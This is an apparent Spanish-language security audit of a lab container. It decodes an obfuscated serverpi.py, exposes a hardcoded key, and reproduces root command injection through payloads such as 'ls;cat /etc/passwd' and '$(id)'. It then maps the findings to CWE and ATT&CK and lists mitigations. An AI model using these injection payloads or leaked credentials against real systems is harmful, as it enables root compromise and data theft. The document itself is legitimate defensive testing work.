# REVERSING PROFUNDO + MAPEO RAG - "smashing" (KuramaCore)

Fecha: 2026-08-13
Enfoque: reversing del código expuesto por el contenedor (+ fuzzing) tratado como entorno de
producción real. Lectura forense únicamente (RoE modificada: lectura OK, modificación/re-deploy NO).

## 1. SUPERFICIE OCULTA (deducida del código, no de fuzzing)
`app.py:34` `company_data["URLs_web"]` lista rutas ficticias (`/api/cpu`, `/documents`,
`/downloads`, `/555555555555509.txt`, subdominios). SONDEADAS con Host cybersec.dl -> todas 404.
Conclusión: son metadatos de relleno, NO rutas implementadas. El subdominio `0internal_down`
sirve bin.html y `/download/<file>` (send_from_directory sobre static/archivos; dir vacío -> 404).
No hay LFI/principal en app.py (Flask sanitiza el path de send_from_directory).

## 2. REVERSING serverpi.py (CRÍTICO)
Código ofuscado en base64 en línea 1. Decodificado -> `SimpleHTTPRequestHandler` en 127.0.0.1:25000.

### Lógica relevante (serverpi_decoded.py)
- Auth: Basic, clave hardcodeada `AUTH_KEY_BASE64` -> `0000cybersec_group_rt_000000` (CWE-798/259).
- `do_GET`:
  - si no Basic -> 401
  - si clave != decodificada -> 403
  - si `exec` en query: `command = query_params['exec'][0]`
  - FILTRO: `allowed_commands=['ls','whoami']; if not any(command.startswith(cmd) for cmd in allowed_commands): 403`
  - `result = subprocess.check_output(command, shell=True, ...)`   <-- VULN
- Bind: `socketserver.TCPServer(("127.0.0.1", 25000), Handler)` -> loopback del contenedor.

### Vector (CWE-77/78 OS Command Injection + CWE-88 Argument Injection)
El filtro solo valida el PREFIJO (`startswith('ls')`/`startswith('whoami')`), pero pasa el resto
de la cadena íntegra a `shell=True`. Cualquier metacarácter de shell (; | && $() `) tras el prefijo
se ejecuta. El filtro por prefijo NO neutraliza inyección: es bypass trivial.

### PoC RCE REPRODUCIDO (desde dentro del contenedor hacia 127.0.0.1:25000; 1 request, read-only)
- Auth: `Authorization: Basic <base64(0000cybersec_group_rt_000000)>`
- `GET /?exec=whoami` -> `root`
- `GET /?exec=ls%3Bcat%20/etc/passwd` -> lista raíz + contenido de /etc/passwd
- `GET /?exec=whoami%24(id)` -> ejecuta `$(id)` -> `uid=0(root)`
=> RCE como ROOT confirmado. El `;` y `$(...)` se URL-encodifican para llegar íntegros al shell.

### Exposición en "producción real"
En este despliegue 25000 es loopback del contenedor (no alcanzable desde el host/bridge).
PERO en un entorno de producción real (o si el bind fuera 0.0.0.0, o vía SSRF desde app.py)
cualquiera con la clave hardcodeada (o que la obtenga del código/binario) tiene RCE remoto como root.
La clave está en el propio código -> no es un secreto.

## 3. MAPEO RAG (AmegakureDojo_RAG)
- CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
- CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- CWE-88: Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')
  -> aplica al bypass del filtro por prefijo.
- CWE-798: Use of Hard-coded Credentials; CWE-259: Use of Hard-coded Password
  -> clave `0000cybersec_group_rt_000000` y credenciales `admin:undertaker`/`user:user123`.
- CWE-94: Code Injection (relacionado, por shell=True).
- MITRE ATT&CK: T1059 (Command and Scripting Interpreter) / T1068 (privesc si no fuera root).
- Patrón del RAG (Pentesting_KB / Session-Hijacking + exploits EXPLOITDB webapps): la cadena
  "credencial hardcodeada -> endpoint con shell=True -> RCE" es un patrón documentado y recurrente.

## 4. OTROS HALLAZGOS (revisión profunda)
- `app.py:112` `debug=True` en 0.0.0.0:80 -> Werkzeug debugger PIN derivable (CWE-489/94, RCE).
- `app.py:38-41` credenciales planas en dict (H1 previo), login sin sesión/cookie.
- `app.py:17-20` before_request redirige por Host (no vuln per se, pero el servicio requiere
  Host cybersec.dl para rutas, lo que complica el acceso pero no aporta seguridad real).
- `sensitive_info` (`app.py:44-47`) referencia `555555555555509.txt` y `dashboard.cybersec.com`
  -> rutas ficticias; el `5555...txt` NO existe (404 verificado).

## 5. CADENA DE EXPLOTACIÓN (entorno producción)
1. Atacante obtiene clave hardcodeada (código/binario o repo) -> `0000cybersec_group_rt_000000`.
2. Alcanza :25000 (si expuesto / SSRF / red interna).
3. `GET /?exec=ls; <cmd>` -> RCE como root (bypass filtro por prefijo, shell=True).
Impacto: compromiso total del contenedor/host (root).

## 6. MITIGACIONES (no aplicadas - RoE)
- Eliminar `shell=True`; usar `subprocess.run([cmd, arg], shell=False)` con lista blanca ESTRICTA de
  binarios y ARGUMENTOS (no prefijos de cadena).
- No hardcodear claves: secret manager / env cifrada; rotar.
- `debug=False` en producción; no exponer Werkzeug debugger.
- No exponer el puerto de gestión interna; si se expone, mTLS + auth fuerte + no root.
- Credenciales en store externo con hash + rate-limit + MFA.

## 7. EVIDENCIA
- audit/evidence/src/serverpi_decoded.py (código ofuscado decodificado)
- audit/evidence/src/app.py, serverpi.py, index.html, bin.html, mail.html
- Salida PoC RCE: verificada en vivo (root, /etc/passwd volcado)
